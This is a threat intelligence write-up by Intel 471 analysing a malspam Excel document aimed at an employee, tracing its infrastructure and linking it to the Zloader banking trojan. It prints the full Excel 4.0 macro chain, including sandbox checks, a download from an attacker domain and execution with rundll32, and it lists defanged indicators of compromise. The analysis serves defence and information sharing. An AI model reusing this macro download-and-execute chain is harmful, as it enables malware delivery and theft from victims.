@@ -1,0 +1,198 @@
+Analysis of an attempted attack against Intel 471
+Mar 26, 2020
+By the Intel 471 Malware Intelligence team.
+Background
+----------
+The following write-up is our analysis of an attack attempted against one of our employees this week.
+At no point was our employee’s system at risk of being compromised.
+Interestingly, the employee’s email address only had been used in very few instances externally.
+We are releasing this information publicly to share tactics, techniques and procedures (TTPs) and encourage others to share similar incidents.
+Summary
+-------
+The threat actor that sent this malspam campaign demonstrated good operational security (OPSEC) by hiding their infrastructure behind professional bulletproof hosting (BPH) services and by filtering traffic to hide final payloads from curious researchers.
+The actor used a series of tools in this operation, including KeitaroTDS, a malicious Microsoft Excel spreadsheet document builder and the Zloader banking trojan (aka Terdot).
+Considering the nature of the malspam documents (usually named “Invoice”) and the use of a banking trojan, we assess the intended goal of the attackers was to make unauthorized bank transfers from victim accounts.
+Email details
+-------------
+The following email was sent to ****@intel471.com 5:26:11 p.m. GMT, Monday, March 23, 2020:
+| **Filename** | March Incoming Invoice from Seed Records.eml |
+| **SHA256 hash** | 5d1bb0aef5545138feb825d5b0669ccc4a68abb4323362f2fe188e86c62aeed0 |
+The sender was an AOL mail account, using the AOL mail portal and a Windows machine using the Google Chrome browser (if the user agent can be trusted).
+| **From: Annika Preston <[[email protected]](/cdn-cgi/l/email-protection)>To: ****@intel471.com**Message-ID: <[[email protected]](/cdn-cgi/l/email-protection)>Subject: March Incoming Invoice from Seed RecordsMIME-Version: 1.0Content-Type: multipart/mixed;boundary="----=\\_Part\\_719010\\_1408914388.1584984371396"References: <[[email protected]](/cdn-cgi/l/email-protection)>X-Mailer: **WebService/1.1.15518 aolwebmail** Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 |
+### Sender IP address
+The mail was received from the Yahoo mail netspace.
+| **Received: from sonic313-9.consmr.mail.ne1.yahoo.com(sonic313-9.consmr.mail.ne1.yahoo.com.[66.163.185.32])** by mx.google.com with ESMTPS id c76si12645930ilg.12.2020.03.23.10.26.15 for <****@intel471.com> (version=TLS1\\_2 cipher=ECDHE-RSA-AES128-GCM-SHA256 bits=128/128); Mon, 23 Mar 2020 10:26:16 -0700 (PDT) |
+Excel spreadsheet details
+-------------------------
+The spreadsheet’s metadata contained the following information:
+| **Property** | **Value** |
+| Create time | 2020-02-27 10:23:09.379000 |
+| Last saved time | 2020-03-23 12:01:22 |
+| Comments | q8uOfaZ1QVOMIl4NtP |
+| Author | N/A |
+The document implemented malicious Excel 4.0 Macros (XLM) to download and execute the secondary stage payload.
+These macros were present in a hidden sheet named "DiOAFArhpr".
+The macros were written vertically, character-by-character inside different cells.
+This approach was employed to bypass detection since analysis tools can fail to retrieve the command strings.
+![](https://d39ec1uo9ktrut.cloudfront.net/pasted-image-0-1-300x163.png)
+The executed macros were:
+|
+```
+=IF(GET.WORKSPACE(13)<770, CLOSE(FALSE),)
+=IF(GET.WORKSPACE(14)<381, CLOSE(FALSE),)
+=IF(GET.WORKSPACE(19),,CLOSE(TRUE))
+=IF(GET.WORKSPACE(42),,CLOSE(TRUE))
+=IF(ISNUMBER(SEARCH("Windows",GET.WORKSPACE(1))),
+,CLOSE(TRUE))
+=CALL("urlmon","URLDownloadToFileA","JJCCJJ",0,
+"hxxps://grpxmqnrb[.]pw/egrg4g3g",
+"c:\Users\Public\fef2fff.html",0,0)
+=ALERT("The workbook cannot be opened or repaired
+by Microsoft Excel because it's corrupt.",2)
+=CALL("Shell32","ShellExecuteA","JJCCCJJ",0,"open",
+"C:\Windows\system32\rundll32.exe",
+"c:\Users\Public\fef2fff.html,DllRegisterServer",0,5)
+```
+|
+The DLL at the location hxxps://grpxmqnrb[.]pw/egrg4g3g was retrieved and saved under "C:\Users\Public\fef2fff.html" before being executed.
+As shown in the HTTP request below, the malicious server performed a redirection to the GitHub software development platform (GitHub was advised) and downloaded a dynamic link library (DLL) from a public repository.
+| GET /egrg4g3g HTTP/1.1Host: grpxmqnrb[.]pwUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)Accept: */*HTTP/1.1 302 FoundServer: nginxDate: Tue, 24 Mar 2020 13:00:34 GMTContent-Type: text/html; charset=UTF-8Content-Length: 0Connection: keep-aliveCache-Control: no-cache, no-store, must-revalidate,post-check=0,pre-check=0Expires: 0Last-Modified: Tue, 24 Mar 2020 13:00:34 GMT**Location: hxxps://github[.]com/arntsonl/calc\\_security\\_poc/raw/master/dll/calc.dll**Pragma: no-cacheSet-Cookie: \\_subid=357bngnes3kqn;Expires=Friday, 24-Apr-2020 13:00:34 GMT;Max-Age=2678400;Path=/X-Content-Type-Options: nosniff |
+Examining it revealed it does nothing but pop the Windows calculator.
+![](https://d39ec1uo9ktrut.cloudfront.net/pasted-image-0-2-300x73.png)
+Clearly, we have received a decoy payload.
+Network artifact research
+-------------------------
+The malicious Excel document contained a macro that downloaded a file from:
+grpxmqnrb[.]pw
+| Creation Date | 2020-03-23T07:08:34.0Z |
+| Expiration Date | 2021-03-23T23:59:59.0Z |
+| Name Servers | A.DNSPOD.COM, B.DNSPOD.COM |
+| Registrar | Namecheap |
+The domain name probably was created solely for this campaign because it was created only days ago and appears to have no legitimate web presence.
+An instance of KeitaroTDS (Traffic Directional System) was found on this domain:
+![](https://d39ec1uo9ktrut.cloudfront.net/pasted-image-0-3-300x205.png)
+The domain has the following DNS records:
+| ;; ANSWER SECTION:grpxmqnrb[.]pw.
+600 IN NS c.dnspod.com.grpxmqnrb[.]pw.
+600 IN NS b.dnspod.com.grpxmqnrb[.]pw.
+600 IN NS a.dnspod.com.grpxmqnrb[.]pw.
+600 IN A 8.208.28.247grpxmqnrb[.]pw.
+600 IN SOA a.dnspod.com.
+domainadmin.dnspod.com.
+1584947588 3600 180 1209600 180 |
+We can see the domain is administered via DNSPod, a product of Chinese company Tencent ().
+The IP address in the address record or “A record” belongs to Alibaba Cloud aka Aliyun.
+| inetnum: 8.208.0.0 - 8.208.255.255netname: ALICLOUD-GBdescr: Aliyun Computing Co.LTD |
+This IP address was identified by our intelligence team as hosted by the well-known Russian-based BPH service [yalishanda](https://krebsonsecurity.com/2019/07/meet-the-worlds-biggest-bulletproof-hoster/).
+The actor yalishanda’s service offers a reverse proxy network that abuses cloud providers, such as Alibaba-Cloud, Tencent Cloud, Google Cloud and others.
+The service uses the Chinese based free DNS provider DNSPOD to rotate client domains across the reverse proxy network.
+This can be thought of as a host-based fast-flux service.
+The fact the threat actors behind this attack have the ability to access and pay for BPH infrastructure lends more credence to the idea they are a somewhat capable and well-resourced group.
+The following table contains information on the SSL certificate used by the domain:
+| **Common name** | grpxmqnrb[.]pw |
+| **Issuer** | Let's Encrypt Authority X3 |
+| **Valid** | From March 22, 2020 to June 20, 2020 |
+| **Signature Algorithm** | sha256WithRSAEncryption |
+| **Serial Number** | 041117a29a27b3b4bda2f53fd1d8ab9581d9 |
+###
+### Passive DNS Results
+Passive DNS results showed plenty of similar and recent activity associated with the IP address 8.208.28[.]247.
+| **Domain** | **First Seen(GMT)** | **Notes** |
+| grpxmqnrb[.]pw | 2020-03-23 00:20:31 | Associated with this campaign and with Yalishanda bulletproof hosting infrastructure.
+|
+| gfhudnjv[.]xyz | 2020-03-24 03:10:29 | Associated with Yalishanda bulletproof hosting infrastructure.
+|
+| wgyafqtc[.]online | 2020-03-18 15:30:23 | Associated with similar Excel doc based campaign:  |
+| wgyvjbse[.]pw | 2020-03-18 14:45:51 | Confirmed Zloader controller domain name |
+| botiq[.]xyz | 2020-03-18 14:46:16 | Confirmed Zloader controller domain name |
+| dhteijwrb[.]host | 2020-03-17 07:55:04 | Linked directly to a very similar campaign: .
+Associated with Yalishanda bulletproof hosting infrastructure.
+|
+| tdvomds[.]pw | 2020-03-16 17:00:00 | Same type of activity: .
+Associated with Yalishanda bulletproof hosting infrastructure.
+|
+| siloban[.]pw | 2020-03-17 07:54:50 | Linked to [161.117.177[.]248](https://www.virustotal.com/gui/ip-address/161.117.177.248) which is a confirmed Zloader controller address and part of yalishanda’s fast-flux bulletproof hosting infrastructure.
+Also a confirmed Zloader controller domain name.
+|
+| hxzfvomd[.]buzz | 2020-03-15 17:00:00 | Linked to several similar campaigns and associated with Yalishanda bulletproof hosting infrastructure.
+|
+Reconstructing the attack
+-------------------------
+We initially were unable to download the intended payload from hxxps://grpxmqnrb[.]pw/egrg4g3g, but by following the trail of infrastructure and record of activity, we were able to reproduce the steps and continue the investigation.
+The file invoice-522.xls (SHA256: 34c5591a749636853aef4f9b3867560319d78ab530a332575fee88a85287dcfa) was analyzed on the VirusTotal intelligence platform and found to communicate with the same IP address, although via a different domain and file path.
+This likely is a previous campaign by the same threat actor or group.
+This analysis provided a successful fetch of the initial payload: 06afeaf2b0b985e0d9e048ea8ef0231026cac4c03d3ddf45f6a4ab18d884505c
+This payload is an exact match of the one received by Amirreza Niakanlahiji and Pedram Amini in their blog post on a previous campaign from the same actors (see: ).
+They received a payload that contacted some unknown controllers:
+* hxxps://aquolepp[.]pw/milagrecf.php
+* hxxps://dhteijwrb[.]host/milagrecf.php
+We recognized these as Zloader control server addresses because they are re-using the milagrecf.php file path for their controller URLs.
+Was it possible our campaign was unrelated.
+As an analyst, one must always approach an investigation with a healthy dose of skepticism.
+A few instances of similar behavior can be coincidental.
+We should look for patterns of behavior to learn how the operation works.
+By pivoting on the response content, we found several similar URLs first seen recently:
+| **First Seen** | **AV Score** | **URL** |
+| 2020-03-19 | 0/ 76 | hxxps://wgyafqtc[.]online/fgwg24g24g |
+| 2020-03-19 | 4/ 76 | hxxps://tdvomds[.]pw/fgwg24g24g |
+| 2020-03-17 | 0/ 71 | hxxp://tdvomds[.]pw/12341324rfefv |
+| 2020-03-19 | 5/ 76 | hxxps://tdvomds[.]pw/12341324rfefv |
+| 2020-03-16 | 1/ 71 | hxxps://hxzfvomd[.]buzz/asf2f1ff |
+| 2020-03-16 | 1/ 71 | hxxp://hxzfvomd[.]buzz/asf2f1ff |
+| 2020-03-05 | 2/ 71 | hxxp://pjtcdnrd[.]pw/fsgbfgbfsg43 |
+| 2020-03-05 | 0/ 71 | hxxps://pjtcdnrd[.]pw/fsgbfgbfsg43 |
+| 2020-03-04 | 2/ 71 | hxxp://wrjmkdod[.]xyz/SDFwef2fvbbe |
+The pattern of behavior is becoming clear.
+Most of these domains can be linked to malicious Excel documents apparently created by the same malicious document builder.
+Based on the research, we can attribute some TTPs to this threat actor.
+Tactics, techniques and procedures
+----------------------------------
+The threat actor proved to have access to many resources in the criminal underground and is comfortable with a range of tools to run the operation.
+The following TTPs were observed:
+* Hiding infrastructure behind BPH from the known vendor yalishanda.
+See Brian Krebs’ blog post on yalishanda [here](https://krebsonsecurity.com/2019/07/meet-the-worlds-biggest-bulletproof-hoster/).
+* Using a malicious Excel document builder to craft documents for malspam campaigns.
+* Using KeitaroTDS for routing traffic and controlling campaign infrastructure.
+* Using Zloader banking trojan for establishing control on victim machines and staging additional payloads such as hidden virtual network computing (HVNC) and launching web-injects.
+* Using legitimate secure sockets layer (SSL) certificates signed by Let’s Encrypt.
+Indicators of compromise
+------------------------
+These can be downloaded in CSV format [here](https://files.intel471.com/Indicators-25Mar2020.csv).
+| **Context** | **Indicator** |
+| Download link from malicious Excel document | hxxps://wgyafqtc[.]online/fgwg24g24g |
+| Download link from malicious Excel document | hxxps://tdvomds[.]pw/fgwg24g24g |
+| Download link from malicious Excel document | hxxp://tdvomds[.]pw/12341324rfefv |
+| Download link from malicious Excel document | hxxps://tdvomds[.]pw/12341324rfefv |
+| Download link from malicious Excel document | hxxps://hxzfvomd[.]buzz/asf2f1ff |
+| Download link from malicious Excel document | hxxp://hxzfvomd[.]buzz/asf2f1ff |
+| Download link from malicious Excel document | hxxp://pjtcdnrd[.]pw/fsgbfgbfsg43 |
+| Download link from malicious Excel document | hxxps://pjtcdnrd[.]pw/fsgbfgbfsg43 |
+| Download link from malicious Excel document | hxxp://wrjmkdod[.]xyz/SDFwef2fvbbe |
+| Yalishanda bulletproof hosting IP | 8.208.28[.]247 |
+| Yalishanda bulletproof hosting IP | 161.117.177[.]248 |
+| Zloader controller URL | hxxps://aquolepp[.]pw/milagrecf.php |
+| Zloader controller URL | hxxps://barbeyo[.]xyz/milagrecf.php |
+| Zloader controller URL | hxxps://bhajkqmd[.]xyz/milagrecf.php |
+| Zloader controller URL | hxxps://botiq[.]xyz/milagrecf.php |
+| Zloader controller URL | hxxps://buhjike[.]host/milagrecf.php |
+| Zloader controller URL | hxxps://bwambztl[.]xyz/milagrecf.php |
+| Zloader controller URL | hxxps://dhteijwrb[.]host/milagrecf.php |
+| Zloader controller URL | hxxps://rizoqur[.]pw/milagrecf.php |
+| Zloader controller URL | hxxps://siloban[.]pw/milagrecf.php |
+| Zloader controller URL | hxxps://wgyvjbse[.]pw/milagrecf.php |
+| Malicious Excel document sample | cfe139d639d461fe731427e79bd7048849080d4d7d906d10fae764eb056f1f0b |
+| Malicious Excel document sample | f1ced9008d9de4109844d99fc924b6e3e4a4062ed37b52ce4b5baed430d004cf |
+| Malicious Excel document sample | 4a5d8cde14f9e8c4f1a0cf514ca084528631d6caa8aa5282a4bf8f58dbf54f33 |
+| Malicious Excel document sample | 9e5edda543358b7ead2614ff75e23d2c271cb917a89003fa8733d9d730950507 |
+| Malicious Excel document sample | 30175739414fa301617ed6f0234992f1b3bc67a8547185cd332ad42c5a170486 |
+| Malicious Excel document sample | 34c5591a749636853aef4f9b3867560319d78ab530a332575fee88a85287dcfa |
+| Zloader malware sample | 8021084f2d006101e0522f62de9c1e22ec55a6639e792dc7eff2826c013597a9 |
+| Zloader malware sample | e81d729e1b810215940eb96e1de3e9500f522e9ba16bca2f9d49113fb462bb4d |
+| Zloader malware sample | 0889271c721391d625a19391275f0e6bf244a5548a1a6eb673c6e16a48e960e1 |
+| Zloader malware sample | 3703d42ee0a6c4115295f14f3980cf205f7e6fb77ed0301c845431728015c812 |
+| Zloader malware sample | 3f2cf070e3740514c4e0dd431392a6727250a9ad3425c5b25ffad2d9d3b74716 |
+| Zloader malware sample | 66f49a261b6086dfdd1c3e2a21f7cb746aa35707490cbd64693d66383ba54c64 |
+| Zloader malware sample | 776fee630d6f89a7a01c5903de93fbd9f12f5cba8df148330a8c6f0cd267890b |
+| Zloader malware sample | 945e3e4f52d30e07a281b20f96bf7150234c18aa4373c683dee74a194b57dcc0 |
+| Zloader malware sample | a347f8b4a17dffa05a4fe9602cf99302201220e7000b5826798dd3d8db7b2b7f |
+| Zloader malware sample | ac60a7471ee5297b9cefb5b3d1c1dbec4b7bf328c8b8649529202a1381acb2a5 |
